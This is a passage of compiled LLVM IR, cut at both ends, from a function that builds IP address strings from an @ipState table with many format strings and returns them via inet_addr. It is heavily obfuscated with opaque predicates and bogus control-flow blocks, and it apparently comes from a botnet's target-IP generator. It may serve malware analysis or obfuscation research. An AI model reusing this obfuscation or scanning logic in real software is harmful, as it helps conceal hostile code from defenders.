  %2010 = icmp eq i32 %2009, 0
  %2011 = icmp slt i32 %2006, 10
  %2012 = or i1 %2010, %2011
  br i1 %2012, label %originalBB250, label %originalBB250alteredBB

originalBB250:                                    ; preds = %originalBB250alteredBB, %2004
  %2013 = load i32, i32* %1, align 4
  %2014 = icmp eq i32 %2013, 98
  %2015 = load i32, i32* @x.61
  %2016 = load i32, i32* @y.62
  %2017 = sub i32 %2015, 1
  %2018 = mul i32 %2015, %2017
  %2019 = urem i32 %2018, 2
  %2020 = icmp eq i32 %2019, 0
  %2021 = icmp slt i32 %2016, 10
  %2022 = or i1 %2020, %2021
  br i1 %2022, label %originalBBpart2252, label %originalBB250alteredBB

originalBBpart2252:                               ; preds = %originalBB250
  br i1 %2014, label %2023, label %2046

; <label>:2023:                                   ; preds = %originalBBpart2252
  %2024 = load i32, i32* @x.61
  %2025 = load i32, i32* @y.62
  %2026 = sub i32 %2024, 1
  %2027 = mul i32 %2024, %2026
  %2028 = urem i32 %2027, 2
  %2029 = icmp eq i32 %2028, 0
  %2030 = icmp slt i32 %2025, 10
  %2031 = or i1 %2029, %2030
  br i1 %2031, label %originalBB254, label %originalBB254alteredBB

originalBB254:                                    ; preds = %originalBB254alteredBB, %2023
  %2032 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2033 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2034 = zext i8 %2033 to i32
  %2035 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2036 = zext i8 %2035 to i32
  %2037 = call i32 (i8*, i8*, ...) @szprintf(i8* %2032, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.621, i32 0, i32 0), i32 %2034, i32 %2036)
  %2038 = load i32, i32* @x.61
  %2039 = load i32, i32* @y.62
  %2040 = sub i32 %2038, 1
  %2041 = mul i32 %2038, %2040
  %2042 = urem i32 %2041, 2
  %2043 = icmp eq i32 %2042, 0
  %2044 = icmp slt i32 %2039, 10
  %2045 = or i1 %2043, %2044
  br i1 %2045, label %originalBBpart2256, label %originalBB254alteredBB

originalBBpart2256:                               ; preds = %originalBB254
  br label %2046

; <label>:2046:                                   ; preds = %originalBBpart2256, %originalBBpart2252
  %2047 = load i32, i32* %1, align 4
  %2048 = icmp eq i32 %2047, 99
  br i1 %2048, label %2049, label %2056

; <label>:2049:                                   ; preds = %2046
  %2050 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2051 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2052 = zext i8 %2051 to i32
  %2053 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2054 = zext i8 %2053 to i32
  %2055 = call i32 (i8*, i8*, ...) @szprintf(i8* %2050, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.622, i32 0, i32 0), i32 %2052, i32 %2054)
  br label %2056

; <label>:2056:                                   ; preds = %2049, %2046
  %2057 = load i32, i32* %1, align 4
  %2058 = icmp eq i32 %2057, 100
  br i1 %2058, label %2059, label %2066

; <label>:2059:                                   ; preds = %2056
  %2060 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2061 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2062 = zext i8 %2061 to i32
  %2063 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2064 = zext i8 %2063 to i32
  %2065 = call i32 (i8*, i8*, ...) @szprintf(i8* %2060, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.623, i32 0, i32 0), i32 %2062, i32 %2064)
  br label %2066

; <label>:2066:                                   ; preds = %2059, %2056
  %2067 = load i32, i32* %1, align 4
  %2068 = icmp eq i32 %2067, 101
  br i1 %2068, label %2069, label %2076

; <label>:2069:                                   ; preds = %2066
  %2070 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2071 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2072 = zext i8 %2071 to i32
  %2073 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2074 = zext i8 %2073 to i32
  %2075 = call i32 (i8*, i8*, ...) @szprintf(i8* %2070, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.624, i32 0, i32 0), i32 %2072, i32 %2074)
  br label %2076

; <label>:2076:                                   ; preds = %2069, %2066
  %2077 = load i32, i32* %1, align 4
  %2078 = icmp eq i32 %2077, 102
  br i1 %2078, label %2079, label %2086

; <label>:2079:                                   ; preds = %2076
  %2080 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2081 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2082 = zext i8 %2081 to i32
  %2083 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2084 = zext i8 %2083 to i32
  %2085 = call i32 (i8*, i8*, ...) @szprintf(i8* %2080, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.625, i32 0, i32 0), i32 %2082, i32 %2084)
  br label %2086

; <label>:2086:                                   ; preds = %2079, %2076
  %2087 = load i32, i32* %1, align 4
  %2088 = icmp eq i32 %2087, 103
  br i1 %2088, label %2089, label %2096

; <label>:2089:                                   ; preds = %2086
  %2090 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2091 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2092 = zext i8 %2091 to i32
  %2093 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2094 = zext i8 %2093 to i32
  %2095 = call i32 (i8*, i8*, ...) @szprintf(i8* %2090, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.626, i32 0, i32 0), i32 %2092, i32 %2094)
  br label %2096

; <label>:2096:                                   ; preds = %2089, %2086
  %2097 = load i32, i32* %1, align 4
  %2098 = icmp eq i32 %2097, 104
  br i1 %2098, label %2099, label %2106

; <label>:2099:                                   ; preds = %2096
  %2100 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2102 = zext i8 %2101 to i32
  %2103 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2104 = zext i8 %2103 to i32
  %2105 = call i32 (i8*, i8*, ...) @szprintf(i8* %2100, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.627, i32 0, i32 0), i32 %2102, i32 %2104)
  br label %2106

; <label>:2106:                                   ; preds = %2099, %2096
  %2107 = load i32, i32* %1, align 4
  %2108 = icmp eq i32 %2107, 105
  br i1 %2108, label %2109, label %2132

; <label>:2109:                                   ; preds = %2106
  %2110 = load i32, i32* @x.61
  %2111 = load i32, i32* @y.62
  %2112 = sub i32 %2110, 1
  %2113 = mul i32 %2110, %2112
  %2114 = urem i32 %2113, 2
  %2115 = icmp eq i32 %2114, 0
  %2116 = icmp slt i32 %2111, 10
  %2117 = or i1 %2115, %2116
  br i1 %2117, label %originalBB258, label %originalBB258alteredBB

originalBB258:                                    ; preds = %originalBB258alteredBB, %2109
  %2118 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2119 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2120 = zext i8 %2119 to i32
  %2121 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2122 = zext i8 %2121 to i32
  %2123 = call i32 (i8*, i8*, ...) @szprintf(i8* %2118, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.628, i32 0, i32 0), i32 %2120, i32 %2122)
  %2124 = load i32, i32* @x.61
  %2125 = load i32, i32* @y.62
  %2126 = sub i32 %2124, 1
  %2127 = mul i32 %2124, %2126
  %2128 = urem i32 %2127, 2
  %2129 = icmp eq i32 %2128, 0
  %2130 = icmp slt i32 %2125, 10
  %2131 = or i1 %2129, %2130
  br i1 %2131, label %originalBBpart2260, label %originalBB258alteredBB

originalBBpart2260:                               ; preds = %originalBB258
  br label %2132

; <label>:2132:                                   ; preds = %originalBBpart2260, %2106
  %2133 = load i32, i32* %1, align 4
  %2134 = icmp eq i32 %2133, 106
  br i1 %2134, label %2135, label %2142

; <label>:2135:                                   ; preds = %2132
  %2136 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2137 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2138 = zext i8 %2137 to i32
  %2139 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2140 = zext i8 %2139 to i32
  %2141 = call i32 (i8*, i8*, ...) @szprintf(i8* %2136, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.629, i32 0, i32 0), i32 %2138, i32 %2140)
  br label %2142

; <label>:2142:                                   ; preds = %2135, %2132
  %2143 = load i32, i32* %1, align 4
  %2144 = icmp eq i32 %2143, 107
  br i1 %2144, label %2145, label %2152

; <label>:2145:                                   ; preds = %2142
  %2146 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2147 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2148 = zext i8 %2147 to i32
  %2149 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2150 = zext i8 %2149 to i32
  %2151 = call i32 (i8*, i8*, ...) @szprintf(i8* %2146, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.630, i32 0, i32 0), i32 %2148, i32 %2150)
  br label %2152

; <label>:2152:                                   ; preds = %2145, %2142
  %2153 = load i32, i32* %1, align 4
  %2154 = icmp eq i32 %2153, 108
  br i1 %2154, label %2155, label %2162

; <label>:2155:                                   ; preds = %2152
  %2156 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2157 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2158 = zext i8 %2157 to i32
  %2159 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2160 = zext i8 %2159 to i32
  %2161 = call i32 (i8*, i8*, ...) @szprintf(i8* %2156, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.631, i32 0, i32 0), i32 %2158, i32 %2160)
  br label %2162

; <label>:2162:                                   ; preds = %2155, %2152
  %2163 = load i32, i32* %1, align 4
  %2164 = icmp eq i32 %2163, 109
  br i1 %2164, label %2165, label %2188

; <label>:2165:                                   ; preds = %2162
  %2166 = load i32, i32* @x.61
  %2167 = load i32, i32* @y.62
  %2168 = sub i32 %2166, 1
  %2169 = mul i32 %2166, %2168
  %2170 = urem i32 %2169, 2
  %2171 = icmp eq i32 %2170, 0
  %2172 = icmp slt i32 %2167, 10
  %2173 = or i1 %2171, %2172
  br i1 %2173, label %originalBB262, label %originalBB262alteredBB

originalBB262:                                    ; preds = %originalBB262alteredBB, %2165
  %2174 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2175 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2176 = zext i8 %2175 to i32
  %2177 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2178 = zext i8 %2177 to i32
  %2179 = call i32 (i8*, i8*, ...) @szprintf(i8* %2174, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.632, i32 0, i32 0), i32 %2176, i32 %2178)
  %2180 = load i32, i32* @x.61
  %2181 = load i32, i32* @y.62
  %2182 = sub i32 %2180, 1
  %2183 = mul i32 %2180, %2182
  %2184 = urem i32 %2183, 2
  %2185 = icmp eq i32 %2184, 0
  %2186 = icmp slt i32 %2181, 10
  %2187 = or i1 %2185, %2186
  br i1 %2187, label %originalBBpart2264, label %originalBB262alteredBB

originalBBpart2264:                               ; preds = %originalBB262
  br label %2188

; <label>:2188:                                   ; preds = %originalBBpart2264, %2162
  %2189 = load i32, i32* %1, align 4
  %2190 = icmp eq i32 %2189, 110
  br i1 %2190, label %2191, label %2198

; <label>:2191:                                   ; preds = %2188
  %2192 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2193 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2194 = zext i8 %2193 to i32
  %2195 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2196 = zext i8 %2195 to i32
  %2197 = call i32 (i8*, i8*, ...) @szprintf(i8* %2192, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.633, i32 0, i32 0), i32 %2194, i32 %2196)
  br label %2198

; <label>:2198:                                   ; preds = %2191, %2188
  %2199 = load i32, i32* %1, align 4
  %2200 = icmp eq i32 %2199, 111
  br i1 %2200, label %2201, label %2208

; <label>:2201:                                   ; preds = %2198
  %2202 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2203 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2204 = zext i8 %2203 to i32
  %2205 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2206 = zext i8 %2205 to i32
  %2207 = call i32 (i8*, i8*, ...) @szprintf(i8* %2202, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.634, i32 0, i32 0), i32 %2204, i32 %2206)
  br label %2208

; <label>:2208:                                   ; preds = %2201, %2198
  %2209 = load i32, i32* %1, align 4
  %2210 = icmp eq i32 %2209, 112
  br i1 %2210, label %2211, label %2218

; <label>:2211:                                   ; preds = %2208
  %2212 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2213 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2214 = zext i8 %2213 to i32
  %2215 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2216 = zext i8 %2215 to i32
  %2217 = call i32 (i8*, i8*, ...) @szprintf(i8* %2212, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.635, i32 0, i32 0), i32 %2214, i32 %2216)
  br label %2218

; <label>:2218:                                   ; preds = %2211, %2208
  %2219 = load i32, i32* %1, align 4
  %2220 = icmp eq i32 %2219, 113
  br i1 %2220, label %2221, label %2228

; <label>:2221:                                   ; preds = %2218
  %2222 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2223 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2224 = zext i8 %2223 to i32
  %2225 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2226 = zext i8 %2225 to i32
  %2227 = call i32 (i8*, i8*, ...) @szprintf(i8* %2222, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.636, i32 0, i32 0), i32 %2224, i32 %2226)
  br label %2228

; <label>:2228:                                   ; preds = %2221, %2218
  %2229 = load i32, i32* %1, align 4
  %2230 = icmp eq i32 %2229, 114
  br i1 %2230, label %2231, label %2238

; <label>:2231:                                   ; preds = %2228
  %2232 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2233 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2234 = zext i8 %2233 to i32
  %2235 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2236 = zext i8 %2235 to i32
  %2237 = call i32 (i8*, i8*, ...) @szprintf(i8* %2232, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.637, i32 0, i32 0), i32 %2234, i32 %2236)
  br label %2238

; <label>:2238:                                   ; preds = %2231, %2228
  %2239 = load i32, i32* %1, align 4
  %2240 = icmp eq i32 %2239, 115
  br i1 %2240, label %2241, label %2248

; <label>:2241:                                   ; preds = %2238
  %2242 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2243 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2244 = zext i8 %2243 to i32
  %2245 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2246 = zext i8 %2245 to i32
  %2247 = call i32 (i8*, i8*, ...) @szprintf(i8* %2242, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.638, i32 0, i32 0), i32 %2244, i32 %2246)
  br label %2248

; <label>:2248:                                   ; preds = %2241, %2238
  %2249 = load i32, i32* @x.61
  %2250 = load i32, i32* @y.62
  %2251 = sub i32 %2249, 1
  %2252 = mul i32 %2249, %2251
  %2253 = urem i32 %2252, 2
  %2254 = icmp eq i32 %2253, 0
  %2255 = icmp slt i32 %2250, 10
  %2256 = or i1 %2254, %2255
  br i1 %2256, label %originalBB266, label %originalBB266alteredBB

originalBB266:                                    ; preds = %originalBB266alteredBB, %2248
  %2257 = load i32, i32* %1, align 4
  %2258 = icmp eq i32 %2257, 116
  %2259 = load i32, i32* @x.61
  %2260 = load i32, i32* @y.62
  %2261 = sub i32 %2259, 1
  %2262 = mul i32 %2259, %2261
  %2263 = urem i32 %2262, 2
  %2264 = icmp eq i32 %2263, 0
  %2265 = icmp slt i32 %2260, 10
  %2266 = or i1 %2264, %2265
  br i1 %2266, label %originalBBpart2268, label %originalBB266alteredBB

originalBBpart2268:                               ; preds = %originalBB266
  br i1 %2258, label %2267, label %2290

; <label>:2267:                                   ; preds = %originalBBpart2268
  %2268 = load i32, i32* @x.61
  %2269 = load i32, i32* @y.62
  %2270 = sub i32 %2268, 1
  %2271 = mul i32 %2268, %2270
  %2272 = urem i32 %2271, 2
  %2273 = icmp eq i32 %2272, 0
  %2274 = icmp slt i32 %2269, 10
  %2275 = or i1 %2273, %2274
  br i1 %2275, label %originalBB270, label %originalBB270alteredBB

originalBB270:                                    ; preds = %originalBB270alteredBB, %2267
  %2276 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2277 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2278 = zext i8 %2277 to i32
  %2279 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2280 = zext i8 %2279 to i32
  %2281 = call i32 (i8*, i8*, ...) @szprintf(i8* %2276, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.639, i32 0, i32 0), i32 %2278, i32 %2280)
  %2282 = load i32, i32* @x.61
  %2283 = load i32, i32* @y.62
  %2284 = sub i32 %2282, 1
  %2285 = mul i32 %2282, %2284
  %2286 = urem i32 %2285, 2
  %2287 = icmp eq i32 %2286, 0
  %2288 = icmp slt i32 %2283, 10
  %2289 = or i1 %2287, %2288
  br i1 %2289, label %originalBBpart2272, label %originalBB270alteredBB

originalBBpart2272:                               ; preds = %originalBB270
  br label %2290

; <label>:2290:                                   ; preds = %originalBBpart2272, %originalBBpart2268
  %2291 = load i32, i32* %1, align 4
  %2292 = icmp eq i32 %2291, 117
  br i1 %2292, label %2293, label %2316

; <label>:2293:                                   ; preds = %2290
  %2294 = load i32, i32* @x.61
  %2295 = load i32, i32* @y.62
  %2296 = sub i32 %2294, 1
  %2297 = mul i32 %2294, %2296
  %2298 = urem i32 %2297, 2
  %2299 = icmp eq i32 %2298, 0
  %2300 = icmp slt i32 %2295, 10
  %2301 = or i1 %2299, %2300
  br i1 %2301, label %originalBB274, label %originalBB274alteredBB

originalBB274:                                    ; preds = %originalBB274alteredBB, %2293
  %2302 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2303 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2304 = zext i8 %2303 to i32
  %2305 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2306 = zext i8 %2305 to i32
  %2307 = call i32 (i8*, i8*, ...) @szprintf(i8* %2302, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.640, i32 0, i32 0), i32 %2304, i32 %2306)
  %2308 = load i32, i32* @x.61
  %2309 = load i32, i32* @y.62
  %2310 = sub i32 %2308, 1
  %2311 = mul i32 %2308, %2310
  %2312 = urem i32 %2311, 2
  %2313 = icmp eq i32 %2312, 0
  %2314 = icmp slt i32 %2309, 10
  %2315 = or i1 %2313, %2314
  br i1 %2315, label %originalBBpart2276, label %originalBB274alteredBB

originalBBpart2276:                               ; preds = %originalBB274
  br label %2316

; <label>:2316:                                   ; preds = %originalBBpart2276, %2290
  %2317 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2318 = call i32 @inet_addr(i8* %2317) #5
  ret i32 %2318

originalBBalteredBB:                              ; preds = %originalBB, %36
  %2319 = load i32, i32* %1, align 4
  %2320 = icmp eq i32 %2319, 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %2321 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2322 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2323 = zext i8 %2322 to i32
  %2324 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2325 = zext i8 %2324 to i32
  %2326 = call i32 (i8*, i8*, ...) @szprintf(i8* %2321, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.528, i32 0, i32 0), i32 %2323, i32 %2325)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %78
  %2327 = load i32, i32* %1, align 4
  %2328 = icmp eq i32 %2327, 3
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %104
  %2329 = load i32, i32* %1, align 4
  %2330 = icmp eq i32 %2329, 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %123
  %2331 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2332 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2333 = zext i8 %2332 to i32
  %2334 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2335 = zext i8 %2334 to i32
  %2336 = call i32 (i8*, i8*, ...) @szprintf(i8* %2331, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.530, i32 0, i32 0), i32 %2333, i32 %2335)
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %149
  %2337 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2338 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2339 = zext i8 %2338 to i32
  %2340 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2341 = zext i8 %2340 to i32
  %2342 = call i32 (i8*, i8*, ...) @szprintf(i8* %2337, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.531, i32 0, i32 0), i32 %2339, i32 %2341)
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %175
  %2343 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2344 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2345 = zext i8 %2344 to i32
  %2346 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2347 = zext i8 %2346 to i32
  %2348 = call i32 (i8*, i8*, ...) @szprintf(i8* %2343, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.532, i32 0, i32 0), i32 %2345, i32 %2347)
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %218
  %2349 = load i32, i32* %1, align 4
  %2350 = icmp eq i32 %2349, 9
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %257
  %2351 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2352 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2353 = zext i8 %2352 to i32
  %2354 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2355 = zext i8 %2354 to i32
  %2356 = call i32 (i8*, i8*, ...) @szprintf(i8* %2351, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.536, i32 0, i32 0), i32 %2353, i32 %2355)
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %283
  %2357 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2358 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2359 = zext i8 %2358 to i32
  %2360 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2361 = zext i8 %2360 to i32
  %2362 = call i32 (i8*, i8*, ...) @szprintf(i8* %2357, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.537, i32 0, i32 0), i32 %2359, i32 %2361)
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %306
  %2363 = load i32, i32* %1, align 4
  %2364 = icmp eq i32 %2363, 13
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %342
  %2365 = load i32, i32* %1, align 4
  %2366 = icmp eq i32 %2365, 15
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %361
  %2367 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2368 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2369 = zext i8 %2368 to i32
  %2370 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2371 = zext i8 %2370 to i32
  %2372 = call i32 (i8*, i8*, ...) @szprintf(i8* %2367, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.540, i32 0, i32 0), i32 %2369, i32 %2371)
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %404
  %2373 = load i32, i32* %1, align 4
  %2374 = icmp eq i32 %2373, 18
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %430
  %2375 = load i32, i32* %1, align 4
  %2376 = icmp eq i32 %2375, 19
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %466
  %2377 = load i32, i32* %1, align 4
  %2378 = icmp eq i32 %2377, 21
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %485
  %2379 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2380 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2381 = zext i8 %2380 to i32
  %2382 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2383 = zext i8 %2382 to i32
  %2384 = call i32 (i8*, i8*, ...) @szprintf(i8* %2379, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.546, i32 0, i32 0), i32 %2381, i32 %2383)
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %558
  %2385 = load i32, i32* %1, align 4
  %2386 = icmp eq i32 %2385, 27
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %577
  %2387 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2388 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2389 = zext i8 %2388 to i32
  %2390 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2391 = zext i8 %2390 to i32
  %2392 = call i32 (i8*, i8*, ...) @szprintf(i8* %2387, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.552, i32 0, i32 0), i32 %2389, i32 %2391)
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %630
  %2393 = load i32, i32* %1, align 4
  %2394 = icmp eq i32 %2393, 31
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %649
  %2395 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2396 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2397 = zext i8 %2396 to i32
  %2398 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
